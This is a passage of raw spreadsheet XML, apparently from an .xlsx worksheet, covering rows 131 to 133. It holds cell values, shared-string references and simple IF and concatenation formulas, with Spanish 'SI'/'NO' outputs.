      <c r="AO131" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP131" s="230"/>
      <c r="AQ131" s="230"/>
      <c r="AR131" s="288">
        <v>3</v>
      </c>
      <c r="AS131" s="288">
        <v>1</v>
      </c>
      <c r="AT131" s="288">
        <v>0</v>
      </c>
      <c r="AU131" s="288">
        <f t="shared" si="24"/>
        <v>1</v>
      </c>
      <c r="AV131" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW131" s="288">
        <v>1</v>
      </c>
      <c r="AX131" s="288">
        <v>1</v>
      </c>
      <c r="AY131" s="288">
        <v>0</v>
      </c>
      <c r="AZ131" s="288">
        <f t="shared" si="38"/>
        <v>1</v>
      </c>
      <c r="BA131" s="289"/>
      <c r="BB131" s="301">
        <v>0</v>
      </c>
      <c r="BC131" s="302">
        <v>0</v>
      </c>
      <c r="BD131" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BE131" s="302">
        <v>0</v>
      </c>
      <c r="BF131" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG131" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH131" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI131" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ131" s="302" t="str">
        <f t="shared" si="25"/>
        <v>-, -</v>
      </c>
      <c r="BK131" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL131" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM131" s="302">
        <v>0</v>
      </c>
      <c r="BN131" s="304">
        <v>3</v>
      </c>
      <c r="BO131" s="304">
        <v>0</v>
      </c>
      <c r="BP131" s="304">
        <v>0</v>
      </c>
      <c r="BQ131" s="304">
        <v>0</v>
      </c>
      <c r="BR131" s="304">
        <f t="shared" si="26"/>
        <v>0</v>
      </c>
      <c r="BS131" s="304">
        <v>0</v>
      </c>
      <c r="BT131" s="304">
        <v>0</v>
      </c>
      <c r="BU131" s="304">
        <v>0</v>
      </c>
      <c r="BV131" s="305">
        <v>0</v>
      </c>
      <c r="BW131" s="317">
        <v>0</v>
      </c>
      <c r="BX131" s="318">
        <v>0</v>
      </c>
      <c r="BY131" s="318" t="s">
        <v>12</v>
      </c>
      <c r="BZ131" s="318">
        <v>0</v>
      </c>
      <c r="CA131" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB131" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CC131" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD131" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE131" s="318" t="str">
        <f t="shared" si="27"/>
        <v>-, -</v>
      </c>
      <c r="CF131" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG131" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH131" s="318">
        <v>0</v>
      </c>
      <c r="CI131" s="319">
        <v>3</v>
      </c>
      <c r="CJ131" s="319">
        <v>0</v>
      </c>
      <c r="CK131" s="319">
        <v>0</v>
      </c>
      <c r="CL131" s="319">
        <v>0</v>
      </c>
      <c r="CM131" s="319">
        <f t="shared" si="28"/>
        <v>0</v>
      </c>
      <c r="CN131" s="319">
        <v>0</v>
      </c>
      <c r="CO131" s="319">
        <v>0</v>
      </c>
      <c r="CP131" s="319">
        <v>0</v>
      </c>
      <c r="CQ131" s="319">
        <v>0</v>
      </c>
      <c r="CR131" s="319">
        <v>0</v>
      </c>
      <c r="CS131" s="320">
        <v>0</v>
      </c>
      <c r="CT131" s="339">
        <v>0</v>
      </c>
      <c r="CU131" s="340">
        <v>0</v>
      </c>
      <c r="CV131" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CW131" s="340">
        <v>0</v>
      </c>
      <c r="CX131" s="340"/>
      <c r="CY131" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CZ131" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA131" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB131" s="340" t="str">
        <f t="shared" si="29"/>
        <v>-, -</v>
      </c>
      <c r="DC131" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD131" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE131" s="340">
        <v>0</v>
      </c>
      <c r="DF131" s="341">
        <v>3</v>
      </c>
      <c r="DG131" s="341">
        <v>0</v>
      </c>
      <c r="DH131" s="341">
        <v>0</v>
      </c>
      <c r="DI131" s="341">
        <v>0</v>
      </c>
      <c r="DJ131" s="341">
        <f t="shared" si="30"/>
        <v>0</v>
      </c>
      <c r="DK131" s="341">
        <v>0</v>
      </c>
      <c r="DL131" s="341">
        <v>0</v>
      </c>
      <c r="DM131" s="341">
        <v>0</v>
      </c>
      <c r="DN131" s="341">
        <v>0</v>
      </c>
      <c r="DO131" s="341">
        <v>0</v>
      </c>
      <c r="DP131" s="342">
        <v>0</v>
      </c>
      <c r="DQ131" s="355">
        <v>2</v>
      </c>
      <c r="DR131" s="356">
        <v>0</v>
      </c>
      <c r="DS131" s="356" t="s">
        <v>196</v>
      </c>
      <c r="DT131" s="356">
        <v>2</v>
      </c>
      <c r="DU131" s="356"/>
      <c r="DV131" s="356" t="s">
        <v>196</v>
      </c>
      <c r="DW131" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX131" s="356" t="s">
        <v>196</v>
      </c>
      <c r="DY131" s="356" t="str">
        <f t="shared" si="31"/>
        <v>-, -</v>
      </c>
      <c r="DZ131" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA131" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB131" s="356">
        <v>0</v>
      </c>
      <c r="EC131" s="357">
        <v>3</v>
      </c>
      <c r="ED131" s="357">
        <v>1</v>
      </c>
      <c r="EE131" s="357">
        <v>0</v>
      </c>
      <c r="EF131" s="357">
        <v>0</v>
      </c>
      <c r="EG131" s="357">
        <f t="shared" si="32"/>
        <v>0</v>
      </c>
      <c r="EH131" s="357">
        <v>1</v>
      </c>
      <c r="EI131" s="357">
        <v>0</v>
      </c>
      <c r="EJ131" s="357">
        <v>0</v>
      </c>
      <c r="EK131" s="357">
        <v>2</v>
      </c>
      <c r="EL131" s="357">
        <v>2</v>
      </c>
      <c r="EM131" s="358">
        <v>0</v>
      </c>
      <c r="EN131" s="368" t="str">
        <f t="shared" ref="EN131:EN139" si="39">IF(U131="L3","SI","NO")</f>
        <v>SI</v>
      </c>
      <c r="EO131" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP131" s="369"/>
      <c r="EQ131" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER131" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES131" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET131" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU131" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV131" s="369"/>
      <c r="EW131" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX131" s="369"/>
      <c r="EY131" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ131" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA131" s="369"/>
      <c r="FB131" s="369"/>
      <c r="FC131" s="369">
        <v>1</v>
      </c>
      <c r="FD131" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
      <c r="FE131" s="369">
        <v>0</v>
      </c>
      <c r="FF131" s="369">
        <v>0</v>
      </c>
      <c r="FG131" s="369">
        <v>0</v>
      </c>
      <c r="FH131" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI131" s="377" t="str">
        <f t="shared" ref="FI131:FI139" si="40">IF(U131="L3","SI","NO")</f>
        <v>SI</v>
      </c>
      <c r="FJ131" s="378">
        <v>1</v>
      </c>
      <c r="FK131" s="378"/>
      <c r="FL131" s="382">
        <v>31914</v>
      </c>
      <c r="FM131" s="378">
        <v>1</v>
      </c>
      <c r="FN131" s="378"/>
      <c r="FO131" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP131" s="378">
        <v>31914</v>
      </c>
      <c r="FQ131" s="378"/>
      <c r="FR131" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS131" s="380"/>
      <c r="FT131" s="380"/>
      <c r="FU131" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV131" s="378"/>
      <c r="FW131" s="378"/>
      <c r="FX131" s="378">
        <v>3</v>
      </c>
      <c r="FY131" s="378">
        <f t="shared" si="37"/>
        <v>0</v>
      </c>
      <c r="FZ131" s="378">
        <v>0</v>
      </c>
      <c r="GA131" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB131" s="378">
        <v>1</v>
      </c>
      <c r="GC131" s="379" t="s">
        <v>2032</v>
      </c>
      <c r="GD131" s="40"/>
      <c r="GE131" s="40"/>
      <c r="GF131" s="40"/>
      <c r="GG131" s="40"/>
      <c r="GH131" s="40"/>
      <c r="GI131" s="40"/>
      <c r="GJ131" s="40"/>
      <c r="GK131" s="40"/>
      <c r="GL131" s="40"/>
      <c r="GM131" s="40"/>
      <c r="GN131" s="40"/>
      <c r="GO131" s="40"/>
      <c r="GP131" s="40"/>
      <c r="GQ131" s="40"/>
      <c r="GR131" s="40"/>
      <c r="GS131" s="40"/>
      <c r="GT131" s="40"/>
      <c r="GU131" s="40"/>
      <c r="GV131" s="40"/>
      <c r="GW131" s="40"/>
      <c r="GX131" s="40"/>
      <c r="GY131" s="40"/>
      <c r="GZ131" s="40"/>
      <c r="HA131" s="40"/>
      <c r="HB131" s="40"/>
      <c r="HC131" s="40"/>
      <c r="HD131" s="40"/>
      <c r="HE131" s="40"/>
      <c r="HF131" s="40"/>
      <c r="HG131" s="40"/>
      <c r="HH131" s="40"/>
      <c r="HI131" s="40"/>
      <c r="HJ131" s="40"/>
      <c r="HK131" s="40"/>
      <c r="HL131" s="40"/>
      <c r="HM131" s="40"/>
      <c r="HN131" s="40"/>
      <c r="HO131" s="40"/>
      <c r="HP131" s="40"/>
      <c r="HQ131" s="40"/>
      <c r="HR131" s="40"/>
      <c r="HS131" s="40"/>
      <c r="HT131" s="40"/>
      <c r="HU131" s="40"/>
      <c r="HV131" s="40"/>
      <c r="HW131" s="40"/>
      <c r="HX131" s="40"/>
      <c r="HY131" s="40"/>
      <c r="HZ131" s="40"/>
      <c r="IA131" s="40"/>
      <c r="IB131" s="40"/>
      <c r="IC131" s="40"/>
      <c r="ID131" s="40"/>
      <c r="IE131" s="40"/>
      <c r="IF131" s="40"/>
      <c r="IG131" s="40"/>
      <c r="IH131" s="40"/>
      <c r="II131" s="40"/>
      <c r="IJ131" s="40"/>
      <c r="IK131" s="40"/>
      <c r="IL131" s="40"/>
      <c r="IM131" s="40"/>
      <c r="IN131" s="40"/>
      <c r="IO131" s="40"/>
      <c r="IP131" s="40"/>
      <c r="IQ131" s="40"/>
      <c r="IR131" s="40"/>
      <c r="IS131" s="40"/>
      <c r="IT131" s="40"/>
      <c r="IU131" s="40"/>
      <c r="IV131" s="40"/>
      <c r="IW131" s="40"/>
      <c r="IX131" s="40"/>
      <c r="IY131" s="40"/>
      <c r="IZ131" s="40"/>
      <c r="JA131" s="40"/>
      <c r="JB131" s="40"/>
      <c r="JC131" s="40"/>
      <c r="JD131" s="40"/>
      <c r="JE131" s="40"/>
      <c r="JF131" s="40"/>
      <c r="JG131" s="40"/>
      <c r="JH131" s="40"/>
      <c r="JI131" s="40"/>
      <c r="JJ131" s="40"/>
      <c r="JK131" s="40"/>
      <c r="JL131" s="40"/>
      <c r="JM131" s="40"/>
      <c r="JN131" s="40"/>
      <c r="JO131" s="40"/>
      <c r="JP131" s="40"/>
      <c r="JQ131" s="40"/>
      <c r="JR131" s="40"/>
      <c r="JS131" s="40"/>
      <c r="JT131" s="40"/>
      <c r="JU131" s="40"/>
      <c r="JV131" s="40"/>
      <c r="JW131" s="40"/>
      <c r="JX131" s="40"/>
      <c r="JY131" s="40"/>
      <c r="JZ131" s="40"/>
      <c r="KA131" s="40"/>
      <c r="KB131" s="40"/>
      <c r="KC131" s="40"/>
      <c r="KD131" s="40"/>
      <c r="KE131" s="40"/>
      <c r="KF131" s="40"/>
      <c r="KG131" s="40"/>
      <c r="KH131" s="40"/>
      <c r="KI131" s="40"/>
      <c r="KJ131" s="40"/>
      <c r="KK131" s="40"/>
      <c r="KL131" s="40"/>
      <c r="KM131" s="40"/>
      <c r="KN131" s="40"/>
      <c r="KO131" s="40"/>
      <c r="KP131" s="40"/>
      <c r="KQ131" s="40"/>
      <c r="KR131" s="40"/>
      <c r="KS131" s="40"/>
      <c r="KT131" s="40"/>
      <c r="KU131" s="40"/>
      <c r="KV131" s="40"/>
      <c r="KW131" s="40"/>
      <c r="KX131" s="40"/>
      <c r="KY131" s="40"/>
      <c r="KZ131" s="40"/>
      <c r="LA131" s="40"/>
      <c r="LB131" s="40"/>
      <c r="LC131" s="40"/>
      <c r="LD131" s="40"/>
      <c r="LE131" s="40"/>
      <c r="LF131" s="40"/>
      <c r="LG131" s="40"/>
      <c r="LH131" s="40"/>
      <c r="LI131" s="40"/>
    </row>
    <row r="132" spans="1:321" ht="39.950000000000003" customHeight="1">
      <c r="B132" s="224" t="s">
        <v>591</v>
      </c>
      <c r="C132" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D132" s="225" t="s">
        <v>592</v>
      </c>
      <c r="E132" s="225" t="s">
        <v>2015</v>
      </c>
      <c r="F132" s="225">
        <v>69</v>
      </c>
      <c r="G132" s="225" t="s">
        <v>2016</v>
      </c>
      <c r="H132" s="225" t="s">
        <v>12</v>
      </c>
      <c r="I132" s="225"/>
      <c r="J132" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K132" s="227" t="s">
        <v>2033</v>
      </c>
      <c r="L132" s="228" t="s">
        <v>2035</v>
      </c>
      <c r="M132" s="227" t="s">
        <v>1403</v>
      </c>
      <c r="N132" s="227" t="s">
        <v>2034</v>
      </c>
      <c r="O132" s="389" t="s">
        <v>2765</v>
      </c>
      <c r="P132" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q132" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R132" s="225"/>
      <c r="S132" s="396"/>
      <c r="T132" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U132" s="230" t="s">
        <v>428</v>
      </c>
      <c r="V132" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W132" s="231"/>
      <c r="X132" s="232" t="s">
        <v>192</v>
      </c>
      <c r="Y132" s="255" t="s">
        <v>186</v>
      </c>
      <c r="Z132" s="256" t="s">
        <v>2036</v>
      </c>
      <c r="AA132" s="257" t="s">
        <v>2413</v>
      </c>
      <c r="AB132" s="256" t="s">
        <v>2502</v>
      </c>
      <c r="AC132" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD132" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE132" s="259" t="s">
        <v>2039</v>
      </c>
      <c r="AF132" s="270" t="s">
        <v>2037</v>
      </c>
      <c r="AG132" s="225" t="s">
        <v>2038</v>
      </c>
      <c r="AH132" s="273" t="s">
        <v>2026</v>
      </c>
      <c r="AI132" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ132" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK132" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL132" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AM132" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN132" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO132" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP132" s="230"/>
      <c r="AQ132" s="230"/>
      <c r="AR132" s="288">
        <v>1364</v>
      </c>
      <c r="AS132" s="288">
        <v>1</v>
      </c>
      <c r="AT132" s="288">
        <v>0</v>
      </c>
      <c r="AU132" s="288">
        <f t="shared" ref="AU132:AU139" si="41">AS132+AT132</f>
        <v>1</v>
      </c>
      <c r="AV132" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW132" s="288">
        <v>1</v>
      </c>
      <c r="AX132" s="288">
        <v>1</v>
      </c>
      <c r="AY132" s="288">
        <v>0</v>
      </c>
      <c r="AZ132" s="288">
        <f t="shared" si="38"/>
        <v>1</v>
      </c>
      <c r="BA132" s="289" t="s">
        <v>2041</v>
      </c>
      <c r="BB132" s="301">
        <v>0</v>
      </c>
      <c r="BC132" s="302">
        <v>0</v>
      </c>
      <c r="BD132" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BE132" s="302">
        <v>0</v>
      </c>
      <c r="BF132" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG132" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH132" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI132" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ132" s="302" t="str">
        <f t="shared" ref="BJ132:BJ139" si="42">BK132 &amp; ", " &amp; BL132</f>
        <v>-, -</v>
      </c>
      <c r="BK132" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL132" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM132" s="302">
        <v>0</v>
      </c>
      <c r="BN132" s="304">
        <v>1360</v>
      </c>
      <c r="BO132" s="304">
        <v>0</v>
      </c>
      <c r="BP132" s="304">
        <v>0</v>
      </c>
      <c r="BQ132" s="304">
        <v>0</v>
      </c>
      <c r="BR132" s="304">
        <f t="shared" ref="BR132:BR139" si="43">BP132+BQ132</f>
        <v>0</v>
      </c>
      <c r="BS132" s="304">
        <v>0</v>
      </c>
      <c r="BT132" s="304">
        <v>0</v>
      </c>
      <c r="BU132" s="304">
        <v>0</v>
      </c>
      <c r="BV132" s="305">
        <v>0</v>
      </c>
      <c r="BW132" s="317">
        <v>0</v>
      </c>
      <c r="BX132" s="318">
        <v>0</v>
      </c>
      <c r="BY132" s="318" t="s">
        <v>12</v>
      </c>
      <c r="BZ132" s="318">
        <v>0</v>
      </c>
      <c r="CA132" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB132" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CC132" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD132" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE132" s="318" t="str">
        <f t="shared" ref="CE132:CE139" si="44">CF132 &amp; ", " &amp; CG132</f>
        <v>-, -</v>
      </c>
      <c r="CF132" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG132" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH132" s="318">
        <v>0</v>
      </c>
      <c r="CI132" s="319">
        <v>1358</v>
      </c>
      <c r="CJ132" s="319">
        <v>0</v>
      </c>
      <c r="CK132" s="319">
        <v>0</v>
      </c>
      <c r="CL132" s="319">
        <v>0</v>
      </c>
      <c r="CM132" s="319">
        <f t="shared" ref="CM132:CM139" si="45">CK132+CL132</f>
        <v>0</v>
      </c>
      <c r="CN132" s="319">
        <v>0</v>
      </c>
      <c r="CO132" s="319">
        <v>0</v>
      </c>
      <c r="CP132" s="319">
        <v>0</v>
      </c>
      <c r="CQ132" s="319">
        <v>0</v>
      </c>
      <c r="CR132" s="319">
        <v>0</v>
      </c>
      <c r="CS132" s="320">
        <v>0</v>
      </c>
      <c r="CT132" s="339">
        <v>0</v>
      </c>
      <c r="CU132" s="340">
        <v>0</v>
      </c>
      <c r="CV132" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CW132" s="340">
        <v>0</v>
      </c>
      <c r="CX132" s="340"/>
      <c r="CY132" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CZ132" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA132" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB132" s="340" t="str">
        <f t="shared" ref="DB132:DB139" si="46">DC132 &amp; ", " &amp; DD132</f>
        <v>-, -</v>
      </c>
      <c r="DC132" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD132" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE132" s="340">
        <v>0</v>
      </c>
      <c r="DF132" s="341">
        <v>1360</v>
      </c>
      <c r="DG132" s="341">
        <v>0</v>
      </c>
      <c r="DH132" s="341">
        <v>0</v>
      </c>
      <c r="DI132" s="341">
        <v>0</v>
      </c>
      <c r="DJ132" s="341">
        <f t="shared" ref="DJ132:DJ139" si="47">DH132+DI132</f>
        <v>0</v>
      </c>
      <c r="DK132" s="341">
        <v>0</v>
      </c>
      <c r="DL132" s="341">
        <v>0</v>
      </c>
      <c r="DM132" s="341">
        <v>0</v>
      </c>
      <c r="DN132" s="341">
        <v>0</v>
      </c>
      <c r="DO132" s="341">
        <v>0</v>
      </c>
      <c r="DP132" s="342">
        <v>0</v>
      </c>
      <c r="DQ132" s="355">
        <v>6</v>
      </c>
      <c r="DR132" s="356">
        <v>0</v>
      </c>
      <c r="DS132" s="356" t="s">
        <v>2040</v>
      </c>
      <c r="DT132" s="356">
        <v>3</v>
      </c>
      <c r="DU132" s="356"/>
      <c r="DV132" s="356" t="s">
        <v>2040</v>
      </c>
      <c r="DW132" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX132" s="356" t="s">
        <v>2040</v>
      </c>
      <c r="DY132" s="356" t="str">
        <f t="shared" ref="DY132:DY139" si="48">DZ132 &amp; ", " &amp; EA132</f>
        <v>-, -</v>
      </c>
      <c r="DZ132" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA132" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB132" s="356">
        <v>0</v>
      </c>
      <c r="EC132" s="357">
        <v>1358</v>
      </c>
      <c r="ED132" s="357">
        <v>1</v>
      </c>
      <c r="EE132" s="357">
        <v>0</v>
      </c>
      <c r="EF132" s="357">
        <v>0</v>
      </c>
      <c r="EG132" s="357">
        <f t="shared" ref="EG132:EG139" si="49">EE132+EF132</f>
        <v>0</v>
      </c>
      <c r="EH132" s="357">
        <v>3</v>
      </c>
      <c r="EI132" s="357">
        <v>0</v>
      </c>
      <c r="EJ132" s="357">
        <v>0</v>
      </c>
      <c r="EK132" s="357">
        <v>6</v>
      </c>
      <c r="EL132" s="357">
        <v>6</v>
      </c>
      <c r="EM132" s="358">
        <v>0</v>
      </c>
      <c r="EN132" s="368" t="str">
        <f t="shared" si="39"/>
        <v>NO</v>
      </c>
      <c r="EO132" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP132" s="369"/>
      <c r="EQ132" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER132" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES132" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET132" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU132" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV132" s="369"/>
      <c r="EW132" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX132" s="369"/>
      <c r="EY132" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ132" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA132" s="369"/>
      <c r="FB132" s="369"/>
      <c r="FC132" s="369">
        <v>0</v>
      </c>
      <c r="FD132" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
      <c r="FE132" s="369">
        <v>0</v>
      </c>
      <c r="FF132" s="369">
        <v>0</v>
      </c>
      <c r="FG132" s="369">
        <v>0</v>
      </c>
      <c r="FH132" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI132" s="377" t="str">
        <f t="shared" si="40"/>
        <v>NO</v>
      </c>
      <c r="FJ132" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK132" s="378"/>
      <c r="FL132" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM132" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN132" s="378"/>
      <c r="FO132" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP132" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ132" s="378"/>
      <c r="FR132" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS132" s="380"/>
      <c r="FT132" s="380"/>
      <c r="FU132" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV132" s="378"/>
      <c r="FW132" s="378"/>
      <c r="FX132" s="378">
        <v>0</v>
      </c>
      <c r="FY132" s="378">
        <f t="shared" si="37"/>
        <v>0</v>
      </c>
      <c r="FZ132" s="378">
        <v>0</v>
      </c>
      <c r="GA132" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB132" s="378">
        <v>0</v>
      </c>
      <c r="GC132" s="379" t="s">
        <v>12</v>
      </c>
      <c r="GD132" s="40"/>
      <c r="GE132" s="40"/>
      <c r="GF132" s="40"/>
      <c r="GG132" s="40"/>
      <c r="GH132" s="40"/>
      <c r="GI132" s="40"/>
      <c r="GJ132" s="40"/>
      <c r="GK132" s="40"/>
      <c r="GL132" s="40"/>
      <c r="GM132" s="40"/>
      <c r="GN132" s="40"/>
      <c r="GO132" s="40"/>
      <c r="GP132" s="40"/>
      <c r="GQ132" s="40"/>
      <c r="GR132" s="40"/>
      <c r="GS132" s="40"/>
      <c r="GT132" s="40"/>
      <c r="GU132" s="40"/>
      <c r="GV132" s="40"/>
      <c r="GW132" s="40"/>
      <c r="GX132" s="40"/>
      <c r="GY132" s="40"/>
      <c r="GZ132" s="40"/>
      <c r="HA132" s="40"/>
      <c r="HB132" s="40"/>
      <c r="HC132" s="40"/>
      <c r="HD132" s="40"/>
      <c r="HE132" s="40"/>
      <c r="HF132" s="40"/>
      <c r="HG132" s="40"/>
      <c r="HH132" s="40"/>
      <c r="HI132" s="40"/>
      <c r="HJ132" s="40"/>
      <c r="HK132" s="40"/>
      <c r="HL132" s="40"/>
      <c r="HM132" s="40"/>
      <c r="HN132" s="40"/>
      <c r="HO132" s="40"/>
      <c r="HP132" s="40"/>
      <c r="HQ132" s="40"/>
      <c r="HR132" s="40"/>
      <c r="HS132" s="40"/>
      <c r="HT132" s="40"/>
      <c r="HU132" s="40"/>
      <c r="HV132" s="40"/>
      <c r="HW132" s="40"/>
      <c r="HX132" s="40"/>
      <c r="HY132" s="40"/>
      <c r="HZ132" s="40"/>
      <c r="IA132" s="40"/>
      <c r="IB132" s="40"/>
      <c r="IC132" s="40"/>
      <c r="ID132" s="40"/>
      <c r="IE132" s="40"/>
      <c r="IF132" s="40"/>
      <c r="IG132" s="40"/>
      <c r="IH132" s="40"/>
      <c r="II132" s="40"/>
      <c r="IJ132" s="40"/>
      <c r="IK132" s="40"/>
      <c r="IL132" s="40"/>
      <c r="IM132" s="40"/>
      <c r="IN132" s="40"/>
      <c r="IO132" s="40"/>
      <c r="IP132" s="40"/>
      <c r="IQ132" s="40"/>
      <c r="IR132" s="40"/>
      <c r="IS132" s="40"/>
      <c r="IT132" s="40"/>
      <c r="IU132" s="40"/>
      <c r="IV132" s="40"/>
      <c r="IW132" s="40"/>
      <c r="IX132" s="40"/>
      <c r="IY132" s="40"/>
      <c r="IZ132" s="40"/>
      <c r="JA132" s="40"/>
      <c r="JB132" s="40"/>
      <c r="JC132" s="40"/>
      <c r="JD132" s="40"/>
      <c r="JE132" s="40"/>
      <c r="JF132" s="40"/>
      <c r="JG132" s="40"/>
      <c r="JH132" s="40"/>
      <c r="JI132" s="40"/>
      <c r="JJ132" s="40"/>
      <c r="JK132" s="40"/>
      <c r="JL132" s="40"/>
      <c r="JM132" s="40"/>
      <c r="JN132" s="40"/>
      <c r="JO132" s="40"/>
      <c r="JP132" s="40"/>
      <c r="JQ132" s="40"/>
      <c r="JR132" s="40"/>
      <c r="JS132" s="40"/>
      <c r="JT132" s="40"/>
      <c r="JU132" s="40"/>
      <c r="JV132" s="40"/>
      <c r="JW132" s="40"/>
      <c r="JX132" s="40"/>
      <c r="JY132" s="40"/>
      <c r="JZ132" s="40"/>
      <c r="KA132" s="40"/>
      <c r="KB132" s="40"/>
      <c r="KC132" s="40"/>
      <c r="KD132" s="40"/>
      <c r="KE132" s="40"/>
      <c r="KF132" s="40"/>
      <c r="KG132" s="40"/>
      <c r="KH132" s="40"/>
      <c r="KI132" s="40"/>
      <c r="KJ132" s="40"/>
      <c r="KK132" s="40"/>
      <c r="KL132" s="40"/>
      <c r="KM132" s="40"/>
      <c r="KN132" s="40"/>
      <c r="KO132" s="40"/>
      <c r="KP132" s="40"/>
      <c r="KQ132" s="40"/>
      <c r="KR132" s="40"/>
      <c r="KS132" s="40"/>
      <c r="KT132" s="40"/>
      <c r="KU132" s="40"/>
      <c r="KV132" s="40"/>
      <c r="KW132" s="40"/>
      <c r="KX132" s="40"/>
      <c r="KY132" s="40"/>
      <c r="KZ132" s="40"/>
      <c r="LA132" s="40"/>
      <c r="LB132" s="40"/>
      <c r="LC132" s="40"/>
      <c r="LD132" s="40"/>
      <c r="LE132" s="40"/>
      <c r="LF132" s="40"/>
      <c r="LG132" s="40"/>
      <c r="LH132" s="40"/>
      <c r="LI132" s="40"/>
    </row>
    <row r="133" spans="1:321" ht="39.950000000000003" customHeight="1">
      <c r="B133" s="224" t="s">
        <v>375</v>
      </c>
      <c r="C133" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D133" s="225" t="s">
        <v>376</v>
      </c>
      <c r="E133" s="225" t="s">
        <v>2042</v>
      </c>
      <c r="F133" s="225">
        <v>70</v>
      </c>
      <c r="G133" s="225" t="s">
        <v>2043</v>
      </c>
      <c r="H133" s="226" t="s">
        <v>2044</v>
      </c>
      <c r="I133" s="225"/>
      <c r="J133" s="225" t="s">
        <v>2045</v>
      </c>
      <c r="K133" s="227" t="s">
        <v>2046</v>
      </c>
      <c r="L133" s="228" t="s">
        <v>2035</v>
      </c>
      <c r="M133" s="227" t="s">
        <v>501</v>
      </c>
      <c r="N133" s="227" t="s">
        <v>2047</v>
      </c>
      <c r="O133" s="389" t="s">
        <v>2766</v>
      </c>
      <c r="P133" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q133" s="225" t="s">
